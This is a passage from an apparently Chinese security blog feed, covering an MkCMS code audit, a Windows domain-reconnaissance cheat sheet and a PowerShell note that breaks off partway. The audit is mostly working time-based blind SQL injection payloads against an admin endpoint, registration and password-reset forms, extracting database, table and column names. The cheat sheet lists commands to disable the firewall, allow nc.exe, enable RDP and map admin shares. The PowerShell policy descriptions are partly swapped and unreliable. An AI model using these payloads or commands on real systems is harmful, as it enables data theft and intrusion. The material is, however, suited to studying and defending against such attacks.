StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br></pre></td></tr></table></figure>

<p>看见这段代码我是懵逼的，仔细看了下发现貌似是过滤整条SQL语句。。不确定就问了下大佬，的确是，不止是过滤sql语句也过滤xss，嗯，对大佬说这是很简单的一个正则表达式(我真垃圾，正则后面还是得好好学一波。。)</p>
<p>可以看见这段正则匹配完整的SQL语句大致把常规的增删改查都给过滤了。</p>
<p>System/library文件对GET、POST、COOKIE、REQUEST使用函数addslashes转义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET)) &#123;</span><br><span class="line">		$_GET = addslashes_deep($_GET);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">		$_POST = addslashes_deep($_POST);</span><br><span class="line">	&#125;</span><br><span class="line">	$_COOKIE = addslashes_deep($_COOKIE);</span><br><span class="line">	$_REQUEST = addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span><span class="params">($_var_0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($_var_0)) &#123;</span><br><span class="line">		<span class="keyword">return</span> $_var_0;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//判断传递过来的值是否是一个数组，如果是数组直接返回，不是数组使用addslashes函数转义</span></span><br><span class="line">		<span class="keyword">return</span> is_array($_var_0) ? array_map(<span class="string">'addslashes_deep'</span>, $_var_0) : addslashes($_var_0);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//管理员修改处的注入点，直接使用GET[‘id’]方式传递参数，是数组所以导致此处没有使用addslashes函数，形成注入点</span></span><br></pre></td></tr></table></figure>

<p>正则可以使用盲注中的延时注入或布尔注入绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入</span><br><span class="line">	payload:</span><br><span class="line">		and if(length(database())&#x3D;6,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;6 页面延时10秒，失败</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeale0dojj31eg0u04bn.jpg" alt="image-20200602220203248"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	and if(length(database())&#x3D;5,sleep(10),1) &#x2F;&#x2F;如果数据库名&#x3D;5 页面延时10秒,成功</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeakjmssjj31j50u0anf.jpg" alt="image-20200602220111981"></p>
<p>验证是存在注入，并且可以用延时注入绕过正则匹配。此处需配合ascii码表来进行测试，如果对应字母的ascii码正确不会延时，错误会延时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称</span><br><span class="line">	payload:http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;101,0,sleep(10))&#x2F;&#x2F;错误延时10秒</span><br></pre></td></tr></table></figure>

<p>101==e，而数据库第一个字符为m==109</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeax8nlv6j31fx0u0qgd.jpg" alt="image-20200602221326238"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">	http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;109,0,sleep(10))&#x2F;&#x2F;正确立即返回</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfeayize5oj31iw0u0tju.jpg" alt="image-20200602221440660"></p>
<p>以此类推</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库第二个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),2,1))&#x3D;107,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第三个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),3,1))&#x3D;99,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第四个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),4,1))&#x3D;109,0,sleep(10))</span><br><span class="line"></span><br><span class="line">数据库第五个字符</span><br><span class="line">	payload：http:&#x2F;&#x2F;mkcms.com&#x2F;admin&#x2F;cms_admin_edit.php?id&#x3D;3 and if(ascii(substr(database(),5,1))&#x3D;115,0,sleep(10))</span><br><span class="line">	</span><br><span class="line">数据库名称为：mkcms</span><br></pre></td></tr></table></figure>

<p>判断数据库中一共有多少张表，由于cms过滤了引号，所以将数据库名转成hex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;0x6D6B636D73)&#x3D;17,sleep(5),0)&#x2F;&#x2F;如果数据库中有17个表，延时5秒</span><br></pre></td></tr></table></figure>



<p>查询数据库的第一个表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">&#x2F;&#x2F;判断数据库第一张表名长度为8</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;8,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第一张表的对应字符为对应ascii码，立即返回，反之延时5秒</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;k</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),2,1)))&#x3D;107,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;c</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),3,1)))&#x3D;99,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),4,1)))&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;s</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),5,1)))&#x3D;115,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),6,1)))&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),7,1)))&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),8,1)))&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">得出数据库第一张表名为：mkcms_ad</span><br></pre></td></tr></table></figure>

<p>逐步查询多个表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询第n个表的表名长度,修改n即可</span><br><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;个数,0,sleep(5))</span><br><span class="line">查询第n个表的表名，修改n即可</span><br><span class="line">and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x6D6B636D73 limit 0,1),1,n)))&#x3D;ascii码,0,sleep(5))</span><br></pre></td></tr></table></figure>



<p>查询列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询mkcms_manager共有9列</span><br><span class="line">	and if((select count(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572)&#x3D;9,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;判断第一个列名的长度</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0,1)&#x3D;4,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断某个列名长度，修改即可</span><br><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit n,1)&#x3D;长度,0,sleep(5))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第一个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;i</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;105,0,sleep(5)i</span><br><span class="line">&#x2F;&#x2F;d</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 0(列),1)&#x3D;100,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第一个列名为：m_id</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;猜解第二个列名</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,1(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;_</span><br><span class="line">and if((select ascii(substr(column_name,2(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;95,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;n</span><br><span class="line">and if((select ascii(substr(column_name,3(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;110,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;a</span><br><span class="line">and if((select ascii(substr(column_name,4(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;97,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;m</span><br><span class="line">and if((select ascii(substr(column_name,5(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;109,0,sleep(5))</span><br><span class="line">&#x2F;&#x2F;e</span><br><span class="line">and if((select ascii(substr(column_name,6(位数),1)) from information_schema.columns where table_name&#x3D;0x6D6B636D735F6D616E61676572 limit 1(列),1)&#x3D;101,0,sleep(5))</span><br><span class="line"></span><br><span class="line">第二个列名为m_name，以此类推</span><br><span class="line">第三个列名为m_password</span><br><span class="line">第四个列名为m_levels</span><br><span class="line">第五个列名为m_random</span><br><span class="line">第六个列名为m_status</span><br><span class="line">第七个列名为m_logintime</span><br><span class="line">第八个列名为m_loginip</span><br><span class="line">第九个列名为m_loginnum</span><br><span class="line"></span><br><span class="line">判断字段中值的长度</span><br><span class="line">and if((SELEct length(id) FRom mkcms_userka limit 0,1)&#x3D;1,0,sleep(5))</span><br><span class="line"></span><br><span class="line">查询字段中的值</span><br><span class="line">and if((select ascii(substr(id,1,1)) from mkcms_userka limit 0,1)&#x3D;49,0,sleep(5))</span><br><span class="line"></span><br><span class="line">其他以此类推</span><br></pre></td></tr></table></figure>

<p>由于手工太麻烦，建议使用sqlmap一把梭</p>
<h3 id="0x04-用户注册处SQL注入"><a href="#0x04-用户注册处SQL注入" class="headerlink" title="0x04 用户注册处SQL注入"></a>0x04 用户注册处SQL注入</h3><p>漏洞存在点：ucenter/reg.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));<span class="comment">//POST使用addslashes函数过滤了，但是此处使用了stripslashes函数反向转义，相当于没有做转义</span></span><br><span class="line"><span class="comment">// 检测用户名是否存在</span></span><br><span class="line">$query = mysql_query(<span class="string">"select u_id from mkcms_user where u_name='$username'"</span>);<span class="comment">//漏洞点，此处会将输入的用户带入数据库查询判断是否重复，且因为stripslashes反向转义，等于没有做过滤，直接拼接，形成注入点</span></span><br><span class="line"><span class="keyword">if</span>(mysql_fetch_array($query))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("用户名已存在，请换个其他的用户名");window.history.go(-1);&lt;/script&gt;'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sqlmap一把梭</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfgqe8cju8j317s0u04qp.jpg" alt="image-20200605003950434"></p>
<h3 id="0x05-密码找回处SQL注入"><a href="#0x05-密码找回处SQL注入" class="headerlink" title="0x05 密码找回处SQL注入"></a>0x05 密码找回处SQL注入</h3><p>漏洞存在点：ucenter/repass.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));<span class="comment">//漏洞点，post方式使用</span></span><br><span class="line">$sql = <span class="string">'update mkcms_user set '</span>.arrtoupdate($_data).<span class="string">' where u_name="'</span>.$username.<span class="string">'"'</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (mysql_query($sql)) </span><br><span class="line"><span class="comment">//删除多余代码保留漏洞代码，可以看见此处代码与用户注册处的代码一样，都是post获取了参数，然后使用stripslashes反向转义，然后直接拼接带入到数据库查询</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfgqub42nsj30v40imqey.jpg" alt="image-20200605005520362"></p>
<p>知道作者使用了stripslashes函数反向转义后，可以直接定位此函数来寻找SQL注入</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>域内信息收集</title>
    <url>/2020/06/03/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfefawqi6aj31c00u01kx.jpg" alt="37"></p>
<a id="more"></a>

<h3 id="0x01-本机信息收集"><a href="#0x01-本机信息收集" class="headerlink" title="0x01 本机信息收集"></a>0x01 本机信息收集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前工作组</span><br><span class="line">	net view</span><br><span class="line"></span><br><span class="line">查询网络配置</span><br><span class="line">	ifconfig &#x2F;all</span><br><span class="line"></span><br><span class="line">本机用户列表</span><br><span class="line">	net user</span><br><span class="line"></span><br><span class="line">管理员用户列表</span><br><span class="line">	net localgroup administrators</span><br><span class="line">	</span><br><span class="line">查看当前在线用户</span><br><span class="line">	query user || qwinsta</span><br><span class="line">	</span><br><span class="line">查询进程</span><br><span class="line">	tasklist &#x2F;v</span><br><span class="line">	wmic process list brief</span><br><span class="line">	</span><br><span class="line">查询端口列表</span><br><span class="line">	netstat -ano</span><br><span class="line">	</span><br><span class="line">查询系统补丁信息等</span><br><span class="line">	systeminfo</span><br><span class="line">	</span><br><span class="line">查询补丁列表</span><br><span class="line">	wmic qfe get caption,description,HotFixID,installed0n</span><br><span class="line"></span><br><span class="line">查询本机共享</span><br><span class="line">	net share</span><br><span class="line">	net share hostname(主机名)</span><br><span class="line">	wmic share get name,path,status</span><br><span class="line">	</span><br><span class="line">IPC$连接</span><br><span class="line">	net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:账号</span><br><span class="line">	net use Z: \\ip\c$ 映射网络主机C盘到本机</span><br><span class="line">	</span><br><span class="line">查询用户权限</span><br><span class="line">	whoami</span><br></pre></td></tr></table></figure>

<h5 id="收集操作系统及安装软件版本信息"><a href="#收集操作系统及安装软件版本信息" class="headerlink" title="收集操作系统及安装软件版本信息"></a>收集操作系统及安装软件版本信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取操作系统和版本信息</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称(name)&quot; &#x2F;C:&quot;OS )&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnam3q16yj30hm01wdfr.jpg" alt="image-20200207022821299"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看安装软件以及版本、路径等</span><br><span class="line">	wmic product get name,version</span><br><span class="line">	powershell &quot;get-wmiobject -class win32_product | select-object -property name,version&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnam9wfsdj30ms052dg1.jpg" alt="image-20200207023024307"></p>
<h5 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关闭防火墙(需管理员权限)</span><br><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbname8imnj31m60nejwn.jpg" alt="image-20200207023641913"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关闭防火墙(需管理员权限)</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamhlzjnj31p60ouwjy.jpg" alt="image-20200207023753883"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询防火墙配置文件</span><br><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnaml9thij30m611g40c.jpg" alt="image-20200207024132560"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自定义防火墙日志存储位置</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序全部连接(适用于03之前系统版本)</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">允许指定程序全部连接</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;allow nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;remote desktop &quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<h5 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看远程连接端口</span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v portnumber</span><br><span class="line"></span><br><span class="line">远程开启3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">远程关闭3389端口</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="0x02-域内信息收集"><a href="#0x02-域内信息收集" class="headerlink" title="0x02 域内信息收集"></a>0x02 域内信息收集</h3><h5 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反向解析查询</span><br><span class="line">nslookup 域名(例：hacker.testlab)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询当前域</span><br><span class="line">net config workstation</span><br></pre></td></tr></table></figure>


<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamypwg8j30k809qaba.jpg" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前时间服务器</span><br><span class="line">net time &#x2F;domain   &#x2F;&#x2F;一般域控服务器同为时间服务器</span><br></pre></td></tr></table></figure>


<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamvfm71j30ek02ymxd.jpg" alt="1"></p>
<h5 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域</span><br><span class="line">	net view &#x2F;domain</span><br><span class="line"></span><br><span class="line">查询域内所有计算机</span><br><span class="line">	net view &#x2F;domain:域名(例 domain：hacker)</span><br><span class="line">	</span><br><span class="line">查询域内所有用户组</span><br><span class="line">	net group &#x2F;domain</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询所有域成员计算机列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamuytrpj30kw0a6jsl.jpg" alt="image-20200207020339816"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取域密码信息</span><br><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnan20vpkj30ey07wwfm.jpg" alt="image-20200207020603858"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取域信任信息</span><br><span class="line">nltest &#x2F;domain_trusts</span><br><span class="line"></span><br><span class="line">查找域控制器机器名</span><br><span class="line">nltest &#x2F;DCLIST:hacker</span><br><span class="line"></span><br><span class="line">查看域控制器主机名</span><br><span class="line">nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamw32gxj30g807owfc.jpg" alt="image-20200207021227520"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看域控制器组</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamwgqhoj30ne074js5.jpg" alt="image-20200207021357499"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询所有域用户列表</span><br><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamuk18yj30ms0723z9.jpg" alt="image-20200207021511718"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取域内用户的详细信息</span><br><span class="line">wmic useraccount get &#x2F;all</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnan0dl03j324g07i79i.jpg" alt="image-20200207021618025"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前用户连接状态</span><br><span class="line">query user</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamwv3s9j30n4036gm3.jpg" alt="image-20200207021758498"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询本地管理员组的用户</span><br><span class="line">Net localgroup administrators</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamu197zj30mu072t9h.jpg" alt="image-20200207021908677"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域管理员用户</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamxc0s4j30pw0dw75v.jpg" alt="image-20200207021957307"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询企业管理员用户组</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnamxt6zvj30ni06mdgm.jpg" alt="image-20200207022118443"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询域用户sid</span><br><span class="line">whoami &#x2F;all</span><br><span class="line"></span><br><span class="line">查询指定用户域信息</span><br><span class="line">net user administrator &#x2F;domain</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gbnan15izmj30n00m4tbk.jpg" alt="image-20200207022616595"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>域内信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell收集域信息</title>
    <url>/2020/06/03/powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfefnjnylhj318t0u0hdt.jpg" alt="39"></p>
<a id="more"></a>

<h3 id="0x00-PowerShell"><a href="#0x00-PowerShell" class="headerlink" title="0x00 PowerShell"></a>0x00 PowerShell</h3><p>PowerShell版本信息：</p>
<ul>
<li><p>2.0    windows2008，windows7</p>
</li>
<li><p>3.0    windows2012，windows8</p>
</li>
<li><p>4.0    windows2012R2，windows8.1</p>
</li>
<li><p>5.0    windows2016，windows10</p>
</li>
</ul>
<p>PowerShell权限</p>
<ul>
<li><p>Restricted</p>
<ul>
<li>默认的设置， 不允许任何script运行</li>
</ul>
</li>
</ul>
<ul>
<li><p>Allsigned         </p>
<ul>
<li>只能运行经过数字证书签名的script</li>
</ul>
</li>
</ul>
<ul>
<li><p>Unrestricted    </p>
<ul>
<li>运行本地的script不需要数字签名，但是运行从网络上下载的script就必须要有数字签名</li>
</ul>
</li>
</ul>
<ul>
<li><p>RemoteSigned</p>
<ul>
<li>允许所有的script运行</li>
</ul>
</li>
</ul>
<p>PowerShell基本命令</p>
<ul>
<li><p>Get-ExecutionPolicy</p>
<ul>
<li><p>查看当前策略</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6b4ae3j30rq05gt9j.jpg" alt="image-20200217162808642"></p>
</li>
</ul>
</li>
<li><p>Set-ExecutionPolicy 参数(例：Unrestricted)</p>
<ul>
<li><p>修改执行策略权限</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6e3msmj30q605sq4g.jpg" alt="image-20200217163122772"></p>
</li>
</ul>
</li>
<li><p>-exec bypass</p>
